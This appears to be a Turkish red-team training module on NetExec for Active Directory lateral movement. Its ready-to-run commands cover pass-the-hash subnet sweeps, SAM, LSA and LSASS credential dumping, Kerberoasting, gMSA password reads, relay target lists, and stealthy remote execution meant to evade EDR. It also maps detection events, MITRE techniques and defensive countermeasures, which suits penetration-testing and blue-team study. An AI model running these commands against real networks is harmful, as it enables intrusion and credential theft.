## 1. Genel Bakış ve Mimari

Yanal hareket sürecinde onlarca veya yüzlerce farklı iş istasyonu ve sunucuyu tek tek `wmiexec` veya `psexec` ile denemek operasyonel açıdan sürdürülemezdir. **NetExec (nxc)** — eski CrackMapExec (CME) projesinin aktif ve modern çatalı — kırmızı takım operatörlerinin yanal hareket süreçlerini endüstriyel boyuta taşıyan **ana otomasyon platformudur**:

```
                       [ NetExec (nxc) Motoru ]
                                  │
     ┌──────────────┬─────────────┼─────────────┬──────────────┐
     ▼              ▼             ▼             ▼              ▼
[ SMB Modülü ] [ LDAP Modülü ] [ WinRM Modülü ] [ WMI Modülü ] [ MSSQL Modülü ]
  • PtH / PtT    • BloodHound   • PowerShell    • Disksiz      • xp_cmdshell
  • Pwn3d! Teyit • AS-REP/Kerb  • CLI Yürütme   • Exec Method  • DB Hasadı
  • Paylaşım     • gMSA Okuma   • Biletli Giriş • Sessiz       • Link Abuse
```

NetExec; çoklu protokol desteğini (SMB, LDAP, WinRM, WMI, MSSQL, RDP, SSH, FTP, VNC), çoklu kimlik doğrulama biçimlerini (parola, NT hash, Kerberos `.ccache`, AES anahtarı) ve zengin bir eklenti/modül ekosistemini tek bir komut satırı arayüzünde harmanlar.

## 2. Teknik Derinlik ve Protokol Analizi

### 2.1 "Pwn3d!" Mantığı ve Yetki Tespiti
NetExec bir hedefe kimlik doğruladıktan sonra, kullanıcının o sistemde **yerel yönetici (Local Administrator / High Integrity)** olup olmadığını anlamak için ayrıcalıklı bir işlem dener:
* SMB protokolünde varsayılan olarak `\\<Hedef>\ADMIN$` paylaşımına veya Service Control Manager (`\pipe\svcctl`) borusuna erişim talep eder.
* Erişim başarılı olursa konsola yeşil renkli **`[+] corp.local\user:password (Pwn3d!)`** çıktısını basar.
* Bu çıktı, operatöre o makinede doğrudan kod çalıştırılabileceğini, LSASS dökümü alınabileceğini veya SAM kovanının çekilebileceğini bildirir.

### 2.2 Uzaktan Yürütme Motorları (`--exec-method`)
NetExec hedef makinede komut çalıştırırken varsayılan olarak `wmiexec` kullanır. Ancak ortamdaki savunma ürünlerine ve açık portlara göre çalışma yöntemi esnekçe değiştirilebilir:

| Yürütme Metodu | Parametre | Mimari Mekanizma | OPSEC İzi |
| :--- | :--- | :--- | :--- |
| **wmiexec** | `--exec-method wmiexec` | WMI `Win32_Process.Create` | **Düşük:** Servis kurmaz, diskte dosya bırakmaz. |
| **smbexec** | `--exec-method smbexec` | Her komut için geçici bir servis oluşturup komut çıktısını dosyaya/pipe'a yönlendirir. | **Orta-Yüksek:** Çok sayıda `Event 7045` üretir. |
| **atexec** | `--exec-method atexec` | Task Scheduler servisi üzerinden zamanlanmış görev oluşturur ve hemen siler. | **Düşük-Orta:** `Event 4698` üretir. |
| **mmcexec** | `--exec-method mmcexec` | DCOM `MMC20.Application` nesnesini tetikleyerek kabuk komutu çalıştırır. | **En Sessiz:** WMI ve PsExec kurallarını atlatır. |

### 2.3 Gelişmiş Modül Ekosistemi (`-M`)
NetExec zengin bir modül kütüphanesi barındırır:
* `-M lsassy`: Bellekten LSASS kimliklerini otomatik döküp ayrıştırır.
* `-M nanodump`: EDR atlatıcı nanodump ile güvenli bellek dökümü alır.
* `-M spider_plus`: Tüm paylaşımları tarayıp hassas dosyaları listeler ve JSON indeks üretir.
* `-M gpp_password`: SYSVOL içindeki eski GPP `cpassword` şifrelerini çözer.
* `-M shadowcredentials`: Hedef nesneye `msDS-KeyCredentialLink` enjekte ederek PKINIT sertifika yolu açar ([Modül 05.4](../Modul_05_Yetki_Yukseltme_ACL_ve_GPO/05.4_Shadow_Credentials.md)).
* `--gen-relay-list`: Alt ağdaki SMB İmzalama (SMB Signing) kapalı olan tüm hedefleri relay için dosyaya döker.

### 2.4 nxcdb — Merkezi Operasyonel Veritabanı
NetExec çalıştırılan her komutun sonucunu yerel SQLite veritabanına (`~/.nxc/workspaces/...`) kaydeder.
* `nxcdb` komutu ile tüm oturum bilgileri, ele geçirilen parolalar, yerel admin olunan makineler (`hosts --pwned`) ve taranan paylaşımlar SQL arayüzü gibi sorgulanabilir.

## 3. Pratik Uygulama ve İleri Düzey Senaryolar

### Senaryo 1: Alt Ağ Genelinde Yetki Haritalama (Pwn3d! Avı)

```bash
# 1. Parola ile tüm alt ağı tarama ve yerel admin olunan makineleri listeleme
nxc smb 10.10.10.0/24 -u jsmith -p 'Summer2024!' | grep 'Pwn3d!'

# 2. NT karması (Pass-the-Hash) ile tarama ve yerel kimlik doğrulama (--local-auth)
nxc smb 10.10.10.0/24 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9 --local-auth

# 3. Yalnızca SMB Signing kapalı olan hedefleri Relay saldırısı için listeleme
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
```

---

### Senaryo 2: NetExec ile Çok Modüllü Otomatik Hasat

```bash
# 1. Pwn3d olunan tüm makinelerde yerel SAM kovanlarını dökme
nxc smb targets.txt -u Administrator -H <hash> --sam

# 2. LSA Secrets (Kayıtlı servis parolaları, task şifreleri) dökümü
nxc smb targets.txt -u Administrator -H <hash> --lsa

# 3. SYSVOL ve genel paylaşımlarda parola içeren dosyaları otomatik tarama
nxc smb 10.10.10.5 -u jsmith -p 'Summer2024!' -M spider_plus -o OUTPUT_FOLDER=/tmp/loot
```

---

### Senaryo 3: LDAP Modülleri ile Tek Satırda Dizin Sömürüsü

```bash
# 1. BloodHound için veri toplayıp otomatik ZIP üretme
nxc ldap 10.10.10.5 -u jsmith -p 'Summer2024!' --bloodhound -c DCOnly -ns 10.10.10.5

# 2. Etki alanındaki tüm Kerberoastable biletleri indirme
nxc ldap 10.10.10.5 -u jsmith -p 'Summer2024!' --kerberoasting kerb_hashes.txt

# 3. gMSA hesaplarının açık metin parolalarını çekme
nxc ldap 10.10.10.5 -u jsmith -p 'Summer2024!' --gmsa
```

---

### Senaryo 4: Uzaktan Kod Yürütme ve nxcdb Yönetimi

```bash
# 1. DCOM (mmcexec) yürütme motoru ile sessizce komut çalıştırma
nxc smb 10.10.10.42 -u Administrator -H <hash> --exec-method mmcexec -x "whoami"

# 2. NetExec yerel veritabanını başlatma ve ele geçirilen tüm kimlikleri listeleme
nxcdb
# Konsol içinde:
# > creds
# > hosts --pwned
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Olası Kök Neden | Çözüm Adımı |
| :--- | :--- | :--- |
| `SMB: STATUS_PIPE_NOT_AVAILABLE` | Hedef makinede Named Pipe sınırına ulaşılmıştır veya SMBv1/v2 el sıkışması zaman aşımına uğramıştır. | Eşzamanlı iş parçacığı sayısını (`-t 10`) düşürün; hedef makineye tekil bağlanın. |
| `0x800706BA - RPC Server Unavailable` | Hedef sistemde Windows Güvenlik Duvarı port 135 veya dinamik RPC erişimini engellemektedir. | Yürütme motorunu değiştirin: WMI yerine WinRM modülünü (`nxc winrm ...`) kullanın. |
| `Module lsassy: Access Denied / LSASS open failed` | Hedef makinede **RunAsPPL** veya Credential Guard aktiftir; lsassy modülü bellek handle'ı açamamıştır. | `--sam` veya `--lsa` ile kayıt defterinden hash çekin ya da `-M nanodump` deneyin. |
| `nxcdb: sqlite3.OperationalError: database is locked` | Başka bir terminalde NetExec arka planda tarama yaparken veritabanı kilitlenmiştir. | Diğer NetExec sürecinin tamamlanmasını bekleyin veya `~/.nxc/workspaces/default/` altındaki kilit dosyasını temizleyin. |
| `STATUS_LOGON_FAILURE on all hosts` | Kullanıcı adı veya parola hatalıdır; birden fazla makinede denenirse hesabı kilitleyebilir! | Taramayı DERHAL durdurun! Tek bir host üzerinde kimliği doğrulayın; parola politikasını (`--pass-pol`) denetleyin. |
| `NetExec: Timeout during thread execution` | Ağda yüksek paket kaybı veya yavaş VPN bağlantısı vardır. | `--timeout 15` parametresi ile zaman aşımı süresini artırın. |

## 5. Bıraktığı İz ve Karşı Tespit (OPSEC & Blue Eşleştirmesi)

### 5.1 Bıraktığı İzler (Artifacts & Telemetri)
* **Windows Security Event ID 4624 (Logon Type 3 - Network):** Alt ağ genelinde tek bir IP'den onlarca makineye kısa sürede yapılan oturum açma istekleri SIEM'de yatay tarama (Horizontal Lateral Movement) alarmı üretir.
* **Security Event ID 5140 / 5145 (Share Object Accessed):** `ADMIN$`, `C$`, `IPC$` paylaşımlarına yönelik seri denetim logları.
* **System Event ID 7045:** `--exec-method smbexec` kullanıldığında oluşan servis kurulum logları.

### 5.2 Ağ ve EDR İmzaları
* Ağ genelinde aynı anda TCP 445 ve TCP 135 portlarına doğru başlatılan yüksek hacimli SYN paketleri NIDS (Snort/Suricata) tarafından port taraması olarak etiketlenir.
* Varsayılan user-agent veya bağlantı bayrakları NetExec imzasını taşır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Senaryosu |
| :--- | :--- | :--- |
| **[T1021.002](https://attack.mitre.org/techniques/T1021/002/)** | Remote Services: SMB/Windows Admin Shares | SMB üzerinden toplu kimlik doğrulama ve Pwn3d tespiti. |
| **[T1047](https://attack.mitre.org/techniques/T1047/)** | Windows Management Instrumentation | WMI ve mmcexec üzerinden uzaktan yürütme otomasyonu. |
| **[T1003](https://attack.mitre.org/techniques/T1003/)** | OS Credential Dumping | `--sam`, `--lsa`, `-M lsassy` ile uzaktan otomatik sır hasadı. |

### 5.4 OPSEC Tavsiyeleri ve Savunma Karşılığı

| Kırmızı Takım Operatör Riski | OPSEC İyileştirme Adımı | Savunma (Blue Team) Karşı Tedbiri |
| :--- | :--- | :--- |
| Tüm `/24` alt ağını körlemesine taramak | Kör tarama yapmayın; önce BloodHound grafiğinden hedef makineyi belirleyip tekil sorgu atın. | İş istasyonları arasında (Workstation-to-Workstation) SMB port 445 trafiğini güvenlik duvarı ile bloklayın. |
| SMBexec servis logları (7045) | `--exec-method wmiexec` veya `mmcexec` kullanın; servis kurmaktan kaçının. | SIEM üzerinde tek bir IP'den 5 dakika içinde 10'dan fazla farklı hosta açılan Type 3 oturumları alarmlayın. |
| Otomatik LSASS dökümü ile yakalanmak | `-M lsassy` modülünü rastgele makinelerde çalıştırmayın; yalnızca Tier 0 admin oturumu olan hostlarda kullanın. | Uç noktalarda RunAsPPL ve Credential Guard zorunlu kılın; bellek döküm girişimlerini engelleyin. |

## 6. En Çok Kullanılan Komutlar (Hızlı Referans / Cheat Sheet)

```bash
# 1. Alt Ağ Genelinde Pwn3d (Yerel Admin) Tespiti
nxc smb 10.10.10.0/24 -u Administrator -H 329153f560eb329c0e1deea55e88a1e9 --local-auth
# Ne Yapar?: Belirtilen hash ile hangi makinelerde tam yetkili olunduğunu gösterir.
# Ne Zaman Kullanılır?: İlk yönetici hash'i alındıktan sonra sıçrama hedeflerini bulmak için.

# 2. SMB İmzalama (Signing) Kapalı Hedefleri Dosyaya Yazma
nxc smb 10.10.10.0/24 --gen-relay-list relay_list.txt
# Ne Yapar?: NTLM Relay saldırısı yapılabilecek zafiyetli sistemleri otomatik filtreler.
# Ne Zaman Kullanılır?: Responder veya koersiyon saldırısı öncesinde.

# 3. Disksiz ve Servissiz Uzaktan Komut Çalıştırma (WMI)
nxc smb 10.10.10.50 -u Administrator -H <hash> --exec-method wmiexec -x "whoami"
# Ne Yapar?: WMI motorunu kullanarak Event 7045 üretmeden hedefte kod çalıştırır.
# Ne Zaman Kullanılır?: EDR sistemlerini atlatarak sessizce komut yürütmek için.

# 4. Ağdaki Paylaşımlarda Parola ve Gizli Dosya Avı (spider_plus)
nxc smb 10.10.10.5 -u jsmith -p 'Summer2024!' -M spider_plus -o OUTPUT_FOLDER=/tmp/loot
# Ne Yapar?: Tüm paylaşımları gezip kdbx, id_rsa, config dosyalarını JSON olarak indeksler.
# Ne Zaman Kullanılır?: Paylaşılan klasörlerde açık metin parola ve anahtar ararken.

# 5. Kerberos Biletli (PtT) SMB Taraması
nxc smb srv01.corp.local -k --use-kcache
# Ne Yapar?: KRB5CCNAME biletini kullanarak parola girmeden yetkileri doğrular.
# Ne Zaman Kullanılır?: Pass-the-Ticket saldırılarında NTLM izi bırakmamak için.

# 6. NetExec Yerel Veritabanında Kayıtlı Tüm Kimlikleri Görme
nxcdb
# Ne Yapar?: Yapılan taramalarda ele geçirilen tüm parola, hash ve hostları listeler.
# Ne Zaman Kullanılır?: Operasyon ortasında toplanan sırları raporlamak ve yönetmek için.
```
